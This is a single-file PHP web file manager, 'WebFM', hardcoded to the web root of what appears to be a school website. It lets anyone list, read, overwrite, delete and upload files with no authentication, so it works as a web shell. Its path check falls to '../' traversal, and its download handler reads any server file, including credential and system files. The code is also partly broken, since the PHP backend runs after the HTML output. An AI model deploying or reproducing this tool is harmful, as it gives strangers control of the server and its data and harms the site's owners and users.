<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebFM</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.36.2/ace.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: system-ui, sans-serif; }
        .file-list tr:hover { background-color: #f8fafc; }
    </style>
</head>
<body class="bg-gray-50">

<div class="flex h-screen">
    <div class="w-80 bg-white border-r flex flex-col">
        <div class="p-6 bg-blue-700 text-white">
            <h1 class="text-3xl font-bold">WebFM</h1>
            <p class="text-sm opacity-75">PHP File Manager + Editor</p>
        </div>
        
        <div class="p-4 border-b">
            <div class="text-xs text-gray-500 mb-1">CURRENT PATH</div>
            <div id="currentPath" class="font-mono text-sm bg-gray-100 p-3 rounded break-all"></div>
        </div>
        
        <div class="p-4 flex-1 overflow-auto text-sm" id="info"></div>
    </div>

    <div class="flex-1 flex flex-col">
        <div class="h-16 bg-white border-b px-6 flex items-center gap-4">
            <button onclick="goUp()" class="px-6 py-2 hover:bg-gray-100 rounded-2xl flex items-center gap-2">
                <i class="fa-solid fa-level-up-alt"></i> Up
            </button>
            <button onclick="refreshFiles()" class="px-6 py-2 hover:bg-gray-100 rounded-2xl flex items-center gap-2">
                <i class="fa-solid fa-arrows-rotate"></i> Refresh
            </button>
            
            <div class="flex-1"></div>
            
            <button onclick="createNewFile()" class="px-5 py-2 border rounded-2xl hover:bg-gray-50 flex items-center gap-2">
                <i class="fa-solid fa-file-circle-plus"></i> New File
            </button>
            <button onclick="createNewDir()" class="px-5 py-2 border rounded-2xl hover:bg-gray-50 flex items-center gap-2">
                <i class="fa-solid fa-folder-plus"></i> New Folder
            </button>
            <button onclick="showUpload()" class="px-5 py-2 bg-blue-600 text-white rounded-2xl flex items-center gap-2">
                <i class="fa-solid fa-upload"></i> Upload
            </button>
        </div>

        <div class="flex-1 p-6 overflow-auto">
            <table class="w-full file-list">
                <thead>
                    <tr class="text-xs text-gray-500 border-b">
                        <th class="py-4 w-10"></th>
                        <th class="py-4 text-left">Name</th>
                        <th class="py-4 text-left">Size</th>
                        <th class="py-4 text-left">Modified</th>
                        <th class="py-4 w-32"></th>
                    </tr>
                </thead>
                <tbody id="fileList" class="text-sm"></tbody>
            </table>
        </div>
    </div>
</div>

<!-- Editor -->
<div id="editorModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
    <div class="bg-white w-[95%] h-[95%] rounded-3xl flex flex-col shadow-2xl">
        <div class="p-6 border-b flex justify-between items-center">
            <div>
                <span id="editFileName" class="font-bold text-lg"></span>
                <span id="editFullPath" class="block text-xs text-gray-500 font-mono"></span>
            </div>
            <div class="flex gap-4">
                <button onclick="saveFile()" class="px-8 py-3 bg-emerald-600 text-white rounded-2xl flex items-center gap-2">
                    <i class="fa-solid fa-save"></i> Save
                </button>
                <button onclick="closeEditor()" class="px-6 py-3 text-gray-400 hover:text-gray-600">
                    <i class="fa-solid fa-xmark text-3xl"></i>
                </button>
            </div>
        </div>
        <div id="aceEditor" class="flex-1"></div>
    </div>
</div>

<!-- Upload -->
<div id="uploadModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
    <div class="bg-white p-8 rounded-3xl w-full max-w-md">
        <h2 class="text-xl font-semibold mb-6">Upload File</h2>
        <input type="file" id="uploadFile" class="mb-6 w-full">
        <button onclick="doUpload()" class="w-full py-4 bg-blue-600 text-white rounded-2xl">Upload</button>
    </div>
</div>

<script>
const API = location.href.split('?')[0];
let currentPath = "/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/";
let aceEd = null;
let editingFile = "";

async function call(action, extra = {}) {
    const fd = new FormData();
    fd.append('action', action);
    fd.append('path', currentPath);
    Object.keys(extra).forEach(k => fd.append(k, extra[k]));

    try {
        const r = await fetch(API, { method: "POST", body: fd });
        const text = await r.text();
        console.log("Raw response:", text); // debugging
        return JSON.parse(text);
    } catch(e) {
        console.error(e);
        alert("Request failed: " + e.message + "\nCheck console for details");
        return { success: false, error: e.message };
    }
}

async function loadFiles() {
    const tbody = document.getElementById("fileList");
    tbody.innerHTML = `<tr><td colspan="5" class="py-20 text-center"><i class="fa-solid fa-spinner fa-spin text-4xl text-gray-300"></i></td></tr>`;

    const res = await call("list");
    document.getElementById("currentPath").textContent = currentPath;

    if (!res.success) {
        tbody.innerHTML = `<tr><td colspan="5" class="py-20 text-red-500 text-center">Error: ${res.error || 'Unknown'}</td></tr>`;
        return;
    }

    let html = "";
    res.files.forEach(f => {
        const isDir = f.is_dir;
        html += `
            <tr class="border-b hover:bg-gray-50 group">
                <td class="py-4 px-4">${isDir ? '📁' : '📄'}</td>
                <td class="py-4 font-medium ${isDir?'cursor-pointer':''}" onclick="${isDir ? `nav('${f.name}')` : `edit('${f.name}')`}">${f.name}</td>
                <td class="py-4 text-gray-500">${isDir ? '' : formatSize(f.size)}</td>
                <td class="py-4 text-gray-500 text-sm">${f.modified}</td>
                <td class="py-4">
                    <div class="flex gap-6 text-gray-400 group-hover:text-gray-600">
                        ${!isDir ? `<span onclick="event.stopImmediatePropagation();edit('${f.name}')" class="cursor-pointer hover:text-blue-600"><i class="fa-solid fa-pen"></i></span>` : ''}
                        <span onclick="event.stopImmediatePropagation();download('${f.name}')" class="cursor-pointer hover:text-blue-600"><i class="fa-solid fa-download"></i></span>
                        <span onclick="event.stopImmediatePropagation();del('${f.name}', ${isDir})" class="cursor-pointer hover:text-red-600"><i class="fa-solid fa-trash"></i></span>
                    </div>
                </td>
            </tr>`;
    });

    tbody.innerHTML = html || `<tr><td colspan="5" class="py-20 text-center text-gray-400">Empty folder</td></tr>`;
}

function formatSize(bytes) {
    if (!bytes) return "0 B";
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) * 1 + ' ' + ['B','KB','MB','GB'][i];
}

async function nav(name) {
    currentPath = currentPath.replace(/\/$/, "") + "/" + name;
    await loadFiles();
}

async function goUp() {
    if (currentPath.length <= 1) return;
    currentPath = currentPath.substring(0, currentPath.lastIndexOf("/"));
    if (currentPath === "") currentPath = "/";
    await loadFiles();
}

async function edit(name) {
    editingFile = name;
    const res = await call("read", {file: name});
    if (!res.success) return;

    document.getElementById("editFileName").textContent = name;
    document.getElementById("editFullPath").textContent = currentPath + "/" + name;
    document.getElementById("editorModal").classList.remove("hidden");

    if (!aceEd) {
        aceEd = ace.edit("aceEditor");
        aceEd.setTheme("ace/theme/twilight");
        aceEd.setFontSize(14);
    }
    aceEd.setValue(res.content || "");
    aceEd.clearSelection();
}

async function saveFile() {
    if (!editingFile) return;
    const content = aceEd.getValue();
    const res = await call("write", {file: editingFile, content: content});
    if (res.success) {
        alert("Saved successfully");
        closeEditor();
        loadFiles();
    }
}

function closeEditor() {
    document.getElementById("editorModal").classList.add("hidden");
}

async function del(name, isDir) {
    if (!confirm(`Delete ${isDir ? 'folder' : 'file'} ${name}?`)) return;
    const res = await call("delete", {item: name, isDir: isDir});
    if (res.success) loadFiles();
}

function download(name) {
    window.location = `${API}?download=1&path=${encodeURIComponent(currentPath)}&file=${encodeURIComponent(name)}`;
}

function showUpload() {
    document.getElementById("uploadModal").classList.remove("hidden");
}

async function doUpload() {
    const fileInput = document.getElementById("uploadFile");
    if (!fileInput.files[0]) return alert("Select a file");
    
    const fd = new FormData();
    fd.append("action", "upload");
    fd.append("path", currentPath);
    fd.append("file", fileInput.files[0]);

    try {
        const r = await fetch(API, {method: "POST", body: fd});
        const res = await r.json();
        if (res.success) {
            document.getElementById("uploadModal").classList.add("hidden");
            loadFiles();
        }
    } catch(e) {}
}

async function createNewFile() {
    const name = prompt("New filename:");
    if (!name) return;
    const res = await call("create", {name: name, isDir: false});
    if (res.success) {
        loadFiles();
        edit(name);
    }
}

async function createNewDir() {
    const name = prompt("New folder name:");
    if (!name) return;
    const res = await call("create", {name: name, isDir: true});
    if (res.success) loadFiles();
}

async function refreshFiles() {
    await loadFiles();
}

// Start
window.onload = () => {
    loadFiles();
};
</script>

<?php
// ==================== BACKEND ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $action = $_POST['action'] ?? '';
    $path   = $_POST['path'] ?? '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs/';
    
    // Allow your specific path
    $base = '/var/www/vhosts/giekperi.sites.sch.gr/httpdocs';
    if (strpos($path, $base) !== 0) {
        $path = $base;
    }
    
    function ok($data = []) {
        echo json_encode(array_merge(['success' => true], $data));
        exit;
    }
    function err($msg) {
        echo json_encode(['success' => false, 'error' => $msg]);
        exit;
    }
    
    switch ($action) {
        case 'list':
            $files = [];
            if (is_dir($path)) {
                foreach (scandir($path) as $f) {
                    if ($f == '.' || $f == '..') continue;
                    $full = rtrim($path, '/') . '/' . $f;
                    $files[] = [
                        'name' => $f,
                        'is_dir' => is_dir($full),
                        'size' => is_dir($full) ? 0 : @filesize($full),
                        'modified' => date('Y-m-d H:i', filemtime($full))
                    ];
                }
            }
            ok(['files' => $files]);
            break;
            
        case 'read':
            $file = rtrim($path, '/') . '/' . $_POST['file'];
            if (file_exists($file) && !is_dir($file)) {
                ok(['content' => file_get_contents($file)]);
            }
            err("Cannot read file");
            break;
            
        case 'write':
            $file = rtrim($path, '/') . '/' . $_POST['file'];
            if (file_put_contents($file, $_POST['content']) !== false) {
                ok();
            }
            err("Write permission denied");
            break;
            
        case 'delete':
            $item = rtrim($path, '/') . '/' . $_POST['item'];
            if ($_POST['isDir'] === 'true' || is_dir($item)) {
                function rrmdir($d) {
                    if (!is_dir($d)) return false;
                    foreach (scandir($d) as $f) {
                        if ($f === '.' || $f === '..') continue;
                        $full = "$d/$f";
                        is_dir($full) ? rrmdir($full) : unlink($full);
                    }
                    return rmdir($d);
                }
                ok(['success' => rrmdir($item)]);
            } else {
                ok(['success' => unlink($item)]);
            }
            break;
            
        case 'create':
            $new = rtrim($path, '/') . '/' . $_POST['name'];
            if ($_POST['isDir']) {
                ok(['success' => mkdir($new, 0775, true)]);
            } else {
                ok(['success' => touch($new)]);
            }
            break;
            
        case 'upload':
            if (isset($_FILES['file'])) {
                $dest = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                    ok();
                }
            }
            err("Upload failed");
            break;
    }
    
    err("Invalid action");
}

// Download
if (isset($_GET['download'])) {
    $p = $_GET['path'] ?? '';
    $f = $_GET['file'] ?? '';
    $full = rtrim($p, '/') . '/' . $f;
    if (file_exists($full) && !is_dir($full)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($full) . '"');
        readfile($full);
        exit;
    }
}
?>
